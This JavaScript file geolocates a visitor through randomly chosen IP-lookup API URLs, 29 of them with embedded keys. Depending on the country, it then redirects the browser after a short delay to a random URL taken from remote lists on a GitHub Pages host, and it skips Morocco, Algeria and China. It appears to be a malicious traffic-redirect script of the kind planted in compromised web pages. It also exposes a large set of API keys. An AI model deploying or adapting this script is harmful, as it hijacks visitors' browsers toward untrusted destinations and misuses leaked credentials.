const jsonUrls = [
    'https://pro.ip-api.com/json/?key=6KddQSe576qrfNb',
    'https://pro.ip-api.com/json/?key=U4NdpvcDcxvMekN',
    'https://pro.ip-api.com/json/?key=9908tZlRhI0pK5W',
    'https://pro.ip-api.com/json/?key=WEPQWHzy7RYlxSd',
    'https://pro.ip-api.com/json/?key=WMFayXqD09GW5u8',
    'https://pro.ip-api.com/json?key=8sVSGSjc3raQhsX',
    'https://pro.ip-api.com/json?key=E7Rt1oUyF5qA3HC',
    'https://pro.ip-api.com/json?key=oR1iAosgCjiPtQi',
    'https://pro.ip-api.com/json/?key=2tjq7YXrdexnO8N',
    'https://pro.ip-api.com/json/?key=qbYk7OjO4GIy9xU',
    'http://pro.ip-api.com/json/?key=xdjZbj0ZiVVozCo',
    'https://pro.ip-api.com/json/?key=SAtoFddpK9OSHLU',
    'https://api.ipgeolocation.io/ipgeo?apiKey=b05dd28c8a8640e6828239aa2475a433',
    'https://api.ipgeolocation.io/ipgeo?apiKey=f298ffa744ce4f369df057fef53a616c',
    'https://api.ipgeolocation.io/ipgeo?apiKey=e599fda391b3490aa95fa4dc91a02a33',
    'https://api.ipgeolocation.io/ipgeo?apiKey=3d51f9c2a42948f2ad9990f70a83f091',
    'https://api.ipgeolocation.io/ipgeo?apiKey=b752e2e2fd6a45e9a0593f035e062908',
    'https://api.ipgeolocation.io/ipgeo?apiKey=901b1003783346d0b4e55b050f6cbdee',
    'https://api.ipgeolocation.io/ipgeo?apiKey=cc885b8e2df94d06b33606e7bc47f339',
    'https://api.ipgeolocation.io/ipgeo?apiKey=5fd22ee3dec643fa8425223e40d14ed4',
    'https://api.ipgeolocation.io/ipgeo?apiKey=2870dd4c8d9c4854b101330bb9f1d288',
    'https://api.ipgeolocation.io/ipgeo?apiKey=db3da8ae12ed4d6b87e8d04279280861',
    'https://api.ipgeolocation.io/ipgeo?apiKey=f787937170744422ac13ed7807707a8c',
    'https://api.ipgeolocation.io/ipgeo?apiKey=8fb1e084645e4a46a4590872290dc853',
    'https://api.ipgeolocation.io/ipgeo?apiKey=a5c0ca4aef6b4dd1a58eb0a657d14bc0',
    'https://api.ipgeolocation.io/ipgeo?apiKey=f7513a8717b842f0bf7f732cc6558a82',
    'https://api.ipgeolocation.io/ipgeo?apiKey=04cf8799075b41a7b9f37365feac19b3',
    'https://api.ipgeolocation.io/ipgeo?apiKey=f2486f52b2e242f6bae60867ce9cd299',
    'https://api.ipgeolocation.io/ipgeo?apiKey=d5b00b6c0ec2490592216aa7cc012d2c'
];

// Fetch country information from a randomly selected JSON URL
const randomIndex = Math.floor(Math.random() * jsonUrls.length);
const randomUrl = jsonUrls[randomIndex];

// Fetch country information using a third-party API
fetch(randomUrl)
    .then(response => response.json())
    .then(data => {
        let countryCode;
    
        // Check if the response contains country code
        if (data.countryCode) {
            countryCode = data.countryCode;
            console.log('country:', countryCode);
        }
        else if (data.country_code2) {
            countryCode = data.country_code2;
            console.log('country_code:', countryCode);
        }
        // Perform country-based redirection using country code or country
        performCountryRedirection(countryCode);
        })
    .catch(error => {
        // Handle error if the API request fails
        console.error('Error:', error);
        // Redirect to a default page if the country detection fails
        redirectToRandomUrl();
        });

// Function to perform country-based redirection
function performCountryRedirection(countryCode) {
    if (countryCode === 'GB') {
        fetchUrls('https://hellonetwork2023.github.io/uk/ukurls.json');
      } else if (countryCode === 'MA' || countryCode === 'DZ' || countryCode === 'CN') {
        return;
      }else {
        fetchUrls('https://hellonetwork2023.github.io/us/usurls.json');
      }
    }

function fetchUrls(jsonFile) {
    fetch(jsonFile)
    .then(response => response.json())
    .then(data => {
        const urls = data.urls.map(site => site.url);
        const randomIndex = Math.floor(Math.random() * urls.length);
        const randomUrl = urls[randomIndex];
        setTimeout(function () {
            window.location.href = randomUrl;
        }, 700);
    })
    .catch(error => {
        console.error('Error:', error);
    });
}
